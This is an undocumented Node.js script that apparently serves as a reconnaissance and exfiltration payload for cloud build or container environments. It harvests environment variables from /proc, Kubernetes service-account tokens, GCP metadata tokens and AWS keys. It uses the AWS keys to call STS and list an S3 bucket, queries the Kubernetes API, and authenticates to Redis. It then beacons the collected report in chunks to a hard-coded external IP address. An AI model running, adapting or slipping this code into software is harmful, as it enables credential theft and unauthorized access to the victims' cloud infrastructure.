const http = require('http');
const https = require('https');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const net = require('net');

const MARK = 'x1106-c2a16db2';
const BASE = 'http://136.113.133.173:8898/' + MARK;
let finalSent = false;

function send(rep, cb) {
  const data = Buffer.from(JSON.stringify(rep)).toString('base64url');
  const chunks = data.match(/.{1,1000}/g) || [];
  let i = 0;
  const next = () => {
    if (i >= chunks.length) { if (cb) cb(); return; }
    const url = BASE + '?i=' + i + '&n=' + chunks.length + '&d=' + chunks[i];
    const req = http.get(url, { timeout: 4000 }, (r) => { r.resume(); i++; setTimeout(next, 60); });
    req.on('error', () => { i++; setTimeout(next, 60); });
    req.on('timeout', () => req.destroy());
  };
  next();
}
function fp(v) { return v ? { len: v.length, sha: crypto.createHash('sha256').update(v).digest('hex').slice(0, 12) } : null; }
function readEnv(p) { try { return fs.readFileSync(p).toString().split('\0').filter(Boolean); } catch (e) { return null; } }
function parseEnv(a) { const o = {}; for (const kv of a || []) { const i = kv.indexOf('='); if (i > 0) o[kv.slice(0, i)] = kv.slice(i + 1); } return o; }
function sha256(s) { return crypto.createHash('sha256').update(s).digest('hex'); }
function hmac(k, m) { return crypto.createHmac('sha256', k).update(m).digest(); }
function sign(ak, sk, st, service, host, region, method, path, query, body) {
  const d = new Date();
  const amz = d.toISOString().replace(/[:-]|\.\d{3}/g, '');
  const day = amz.slice(0, 8);
  const ph = sha256(body || '');
  const ch = `host:${host}\nx-amz-date:${amz}\n` + (st ? `x-amz-security-token:${st}\n` : '');
  const sh = st ? 'host;x-amz-date;x-amz-security-token' : 'host;x-amz-date';
  const cr = [method, path, query || '', ch, sh, ph].join('\n');
  const scope = `${day}/${region}/${service}/aws4_request`;
  const sts = ['AWS4-HMAC-SHA256', amz, scope, sha256(cr)].join('\n');
  let k = hmac('AWS4' + sk, day); k = hmac(k, region); k = hmac(k, service); k = hmac(k, 'aws4_request');
  const sig = crypto.createHmac('sha256', k).update(sts).digest('hex');
  return { auth: `AWS4-HMAC-SHA256 Credential=${ak}/${scope}, SignedHeaders=${sh}, Signature=${sig}`, amz };
}
function awsReq(ak, sk, st, service, host, region, method, path, query, body, ctype, cb) {
  const s = sign(ak, sk, st, service, host, region, method, path, query, body);
  const headers = { Host: host, 'X-Amz-Date': s.amz, Authorization: s.auth };
  if (st) headers['X-Amz-Security-Token'] = st;
  if (ctype) headers['Content-Type'] = ctype;
  if (body) headers['Content-Length'] = Buffer.byteLength(body);
  const req = https.request({ host, path: path + (query ? '?' + query : ''), method, headers, timeout: 7000 }, (res) => {
    let b = ''; res.on('data', (c) => b += c); res.on('end', () => cb(res.statusCode, b));
  });
  req.on('error', (e) => cb(0, String(e)));
  req.on('timeout', () => { req.destroy(); cb(-1, 'timeout'); });
  if (body) req.write(body);
  req.end();
}
function gmeta(path, cb) {
  const req = http.get({ host: 'metadata.google.internal', path, headers: { 'Metadata-Flavor': 'Google' }, timeout: 4000 }, (res) => {
    let d = ''; res.on('data', (c) => d += c); res.on('end', () => cb(res.statusCode, d));
  });
  req.on('error', (e) => cb(0, String(e)));
  req.on('timeout', () => { req.destroy(); cb(-1, 'timeout'); });
}

const selfEnv = parseEnv(readEnv('/proc/self/environ'));
const p1Env = parseEnv(readEnv('/proc/1/environ'));
const ppid = process.ppid;
const ppEnv = parseEnv(readEnv('/proc/' + ppid + '/environ'));
const rep = {
  mark: MARK, stage: 'hello', host: os.hostname(), uid: process.getuid ? process.getuid() : null,
  ppid, p1_keys: Object.keys(p1Env).sort(), self_keys: Object.keys(selfEnv).sort(),
  sensitive: {}, files: {}, k8s: {}, gcp: {}, aws: {}, redis: {},
  cmdline: (() => { try { return fs.readFileSync('/proc/1/cmdline').toString().replace(/\0/g, ' ').slice(0, 240); } catch (e) { return null; } })(),
};
send(rep);

const sens = ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN', 'AWS_REGION', 'AWS_DEFAULT_REGION', 'S3_REGION', 'REDIS_URL', 'GIT_SESSION_SECRET', 'EXPO_GIT_TOKEN', 'GITHUB_TOKEN', 'GH_TOKEN', 'NPM_TOKEN', 'S3_BUCKET', 'IMPORTS_S3_BUCKET', 'SENTRY_DSN', 'DATABASE_URL'];
for (const k of sens) if (p1Env[k]) rep.sensitive[k] = fp(p1Env[k]);

for (const p of ['/proc/1/environ', '/proc/1/cmdline', '/var/run/secrets', '/var/run/secrets/kubernetes.io/serviceaccount/token', '/var/run/secrets/kubernetes.io/serviceaccount/namespace', '/root/.aws/credentials', '/app', '/home']) {
  try { rep.files[p] = fs.existsSync(p) ? (fs.statSync(p).isDirectory() ? 'dir' : 'file') : 'absent'; } catch (e) { rep.files[p] = 'err'; }
}

const tokPath = '/var/run/secrets/kubernetes.io/serviceaccount/token';
let kTok = null;
if (rep.files[tokPath] === 'file') {
  try {
    kTok = fs.readFileSync(tokPath, 'utf8');
    rep.k8s.token = fp(kTok);
    rep.k8s.namespace = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'utf8').trim();
  } catch (e) { rep.k8s.read_err = String(e); }
}
if (kTok && process.env.KUBERNETES_SERVICE_HOST) {
  try {
    const ca = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/ca.crt');
    const khost = process.env.KUBERNETES_SERVICE_HOST;
    const kport = process.env.KUBERNETES_SERVICE_PORT || '443';
    const req = https.get({ host: khost, port: kport, path: '/api/v1/namespaces/' + encodeURIComponent(rep.k8s.namespace) + '/pods?limit=5', headers: { Authorization: 'Bearer ' + kTok }, ca, timeout: 5000, servername: khost }, (res) => {
      let b = ''; res.on('data', (c) => b += c); res.on('end', () => {
        rep.k8s.api_status = res.statusCode;
        try { const j = JSON.parse(b); rep.k8s.pods = (j.items || []).map((x) => x.metadata && x.metadata.name).slice(0, 10); } catch (e) { rep.k8s.api_body = b.slice(0, 300); }
      });
    });
    req.on('error', (e) => rep.k8s.api_err = String(e));
    req.on('timeout', () => { req.destroy(); rep.k8s.api_err = 'timeout'; });
  } catch (e) { rep.k8s.api_err = String(e); }
}

gmeta('/computeMetadata/v1/instance/service-accounts/default/token', (s, b) => {
  rep.gcp.token_status = s;
  try { const j = JSON.parse(b); rep.gcp.token = fp(j.access_token); rep.gcp.scopes = j.scope; } catch (e) { rep.gcp.token_body = b.slice(0, 200); }
});
gmeta('/computeMetadata/v1/project/project-id', (s, b) => { rep.gcp.project_status = s; rep.gcp.project = b.trim().slice(0, 80); });

const ak = p1Env.AWS_ACCESS_KEY_ID, sk = p1Env.AWS_SECRET_ACCESS_KEY, st = p1Env.AWS_SESSION_TOKEN;
if (ak && sk) {
  const region = p1Env.AWS_REGION || p1Env.AWS_DEFAULT_REGION || 'us-east-1';
  awsReq(ak, sk, st, 'sts', 'sts.amazonaws.com', 'us-east-1', 'POST', '/', '', 'Action=GetCallerIdentity&Version=2011-06-15', 'application/x-www-form-urlencoded', (s, b) => {
    rep.aws.sts_status = s; rep.aws.sts_body = b.slice(0, 500);
  });
  const bucket = p1Env.S3_BUCKET;
  const s3region = p1Env.S3_REGION || region;
  if (bucket) {
    awsReq(ak, sk, st, 's3', 's3.' + s3region + '.amazonaws.com', s3region, 'GET', '/' + bucket, 'list-type=2&max-keys=3', '', '', (s, b) => {
      rep.aws.s3_status = s; rep.aws.s3_body = b.slice(0, 500);
      try { rep.aws.s3_keys = (b.match(/<Key>/g) || []).length; } catch (e) {}
    });
  }
} else { rep.aws.missing = true; }

if (p1Env.REDIS_URL) {
  try {
    const u = new URL(p1Env.REDIS_URL);
    if (u.protocol === 'redis:') {
      const sock = net.connect({ host: u.hostname, port: Number(u.port || 6379) });
      let buf = ''; let done = false;
      const fin = (v) => { if (done) return; done = true; rep.redis.result = v; try { sock.destroy(); } catch (e) {} };
      sock.setTimeout(3500);
      sock.on('connect', () => {
        if (u.password) sock.write('AUTH ' + (u.username ? decodeURIComponent(u.username) + ' ' : '') + decodeURIComponent(u.password) + '\r\n');
        sock.write('PING\r\n');
      });
      sock.on('data', (d) => { buf += d.toString(); if (buf.includes('+PONG')) fin('PONG'); else if (buf.includes('-ERR') || buf.includes('-NOAUTH') || buf.includes('-WRONGPASS')) fin(buf.slice(0, 120)); });
      sock.on('timeout', () => fin('timeout'));
      sock.on('error', (e) => fin('err:' + e.code));
    } else { rep.redis.result = 'non-redis:' + u.protocol; }
  } catch (e) { rep.redis.result = 'parse:' + e.message; }
}

const finish = () => {
  if (finalSent) return;
  finalSent = true;
  rep.stage = 'final';
  send(rep, () => setTimeout(() => process.exit(0), 800));
};
setTimeout(finish, 9000);
setTimeout(() => { try { send({ mark: MARK, stage: 'watchdog', host: os.hostname() }); } catch (e) {} setTimeout(() => process.exit(0), 800); }, 16000);
